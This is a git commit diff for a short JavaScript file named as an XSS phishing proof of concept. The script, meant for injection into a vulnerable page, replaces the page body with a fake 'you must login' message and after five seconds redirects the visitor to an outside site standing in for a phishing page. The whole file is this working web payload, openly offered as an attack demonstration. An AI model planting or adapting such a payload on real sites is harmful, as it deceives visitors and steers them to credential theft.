cf8aa750b663c50b853b6ac2f5811d28651f20fc
Adam Ziaja <adamziaja@users.noreply.github.com>
2014-03-08 22:41:01 +0100

    XSS phishing PoC

--- xss_phishing_poc.js
+++ xss_phishing_poc.js
@@ -1,12 +1,6 @@
 <script>
     // XSS phishing PoC
     // (C) 2014 Adam Ziaja <adam@adamziaja.com> http://adamziaja.com
-
     document.body.innerHTML='To view this page, you must <a href="http://adamziaja.com">login</a>. You will be redirected to the login page automatically in 5 seconds.'
-
-    function phishing() {
-        location.replace('http://adamziaja.com')
-    }
-    
-    setTimeout('phishing()', 5000)
+    setTimeout('location.replace("http://adamziaja.com")', 5000)
 </script>
